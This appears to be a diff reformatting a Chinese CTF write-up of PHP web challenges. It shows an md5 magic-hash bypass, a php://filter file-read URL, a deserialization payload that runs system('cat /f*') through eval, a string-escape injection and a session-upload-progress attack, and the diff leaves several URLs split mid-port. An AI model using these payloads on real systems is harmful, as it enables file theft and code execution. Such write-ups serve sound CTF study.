@@ -25,9 +25,11 @@ Web
 
 md5_php
 
-GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
+GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:
+46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
 
-http://39.106.153.217:46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag
+http://39.106.153.217:
+46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag
 
 2
 
@@ -39,8 +41,10 @@ https://www.xiaohongyan.cn/articles/2022/04/27/1651046661350.html
 
 反序列化
 
-<?phpclass main{ protected $ClassObj;
- function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D
+<?php
+class main{ protected $ClassObj;
+ function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:
+16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D
 
 4
 
@@ -48,10 +52,13 @@ phpti
 
 <?phperror_reporting(0);highlight_string(file_get_contents('sessionti1.php'));class a{ public $uname; public $password; public function __construct($uname,$password){ $this->uname=$uname; $this->password=$password; } public function __wakeup(){ if($this->password==='admin') { highlight_string(file_get_contents('flag.php')); include('flag.php'); } else { echo 'hacker !!!'; } }}
 function filter($string){ return str_replace('phpinfo()','phpinfo()up',$string);}
-$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?> 
-<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025
+$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?>
+<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:
+45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025
 
-<form action="http://39.107.81.36:45787/flag.php" method="POST" enctype="multipart/form-data"> <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /> <input type="file" name="file" /> <input type="submit" /></form>POST /flag.php HTTP/1.1Host: 39.107.81.36:45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+<form action="http://39.107.81.36:
+45787/flag.php" method="POST" enctype="multipart/form-data">   </form>POST /flag.php HTTP/1.1Host: 39.107.81.36:
+45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
 123-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="file"; filename="|O:5:"admin":1:{s:4:"root";s:36:"print_r(scandir(dirname(__FILE__)));";}"Content-Type: image/png塒NG
 
 02
@@ -96,47 +103,24 @@ EDI安全
 
 
 ```
-GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
-```
-
-
-
-```
-http://39.106.153.217:46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag
-```
-
-
-
-```
+GET /?md5=0e215962017 HTTP/1.1Host: 39.106.153.217:
+46975Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
+http://39.106.153.217:
+46975/le.php?file=php://filter/convert.base64-encode/index/resource=flag
 https://www.xiaohongyan.cn/articles/2022/04/27/1651046661350.html
-```
-
-
-
-```
-<?phpclass main{ protected $ClassObj;
- function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D
-```
-
-
-
-```
+<?php
+class main{ protected $ClassObj;
+ function __construct(){ $this->ClassObj = new evil();    }}// class easy{// function action(){// echo "hello Hacker";// }// }class evil{ private $file= 'system("cat /f*");'; function action(){ eval($this->file); }}$a = new main();echo urlencode(serialize($a));http://101.200.32.152:
+16798/?a=O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00file%22%3Bs%3A18%3A%22system%28%22cat+%2Ff%2A%22%29%3B%22%3B%7D%7D
 <?phperror_reporting(0);highlight_string(file_get_contents('sessionti1.php'));class a{ public $uname; public $password; public function __construct($uname,$password){ $this->uname=$uname; $this->password=$password; } public function __wakeup(){ if($this->password==='admin') { highlight_string(file_get_contents('flag.php')); include('flag.php'); } else { echo 'hacker !!!'; } }}
 function filter($string){ return str_replace('phpinfo()','phpinfo()up',$string);}
-$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?> 
-<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025
-```
-
-
-
-```
-<form action="http://39.107.81.36:45787/flag.php" method="POST" enctype="multipart/form-data"> <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /> <input type="file" name="file" /> <input type="submit" /></form>POST /flag.php HTTP/1.1Host: 39.107.81.36:45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+$uname=$_GET["admin"];$password=123456;$ser=filter(serialize(new a($uname,$password)));var_dump($ser);// $ser=filter(serialize(new a($uname,$password)));// $test=unserialize($ser);?>
+<!-- O:1:"a":2:{s:5:"uname";s:1:"?";s:8:"password";s:5:"admin";} -->1=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()";s:8:"password";s:5:"admin";}http://39.107.81.36:
+45787/sessionti1.php?admin=phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()phpinfo()%22;s:8:%22password%22;s:5:%22admin%22;}https://www.jb51.net/article/241817.htmhttps://blog.csdn.net/bmth666/article/details/104737025
+<form action="http://39.107.81.36:
+45787/flag.php" method="POST" enctype="multipart/form-data">   </form>POST /flag.php HTTP/1.1Host: 39.107.81.36:
+45787User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:83.1) Gecko/20100101 Firefox/83.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------169043664136240902353881690649Content-Length: 500Origin: nullConnection: closeCookie: PHPSESSID=ufikfl87kj719o80l9nfrhd2fqUpgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
 123-----------------------------169043664136240902353881690649Content-Disposition: form-data; name="file"; filename="|O:5:"admin":1:{s:4:"root";s:36:"print_r(scandir(dirname(__FILE__)));";}"Content-Type: image/png塒NG
-```
-
-
-
-```
 dd = open('12.zip','wb')f1 = open('flag44c099db1.zip','rb')for l in f1.read(): if l == 0: dd.write(bytes([0x0])) else:        dd.write(bytes([0x100-l]))dd.close()
 ```
 
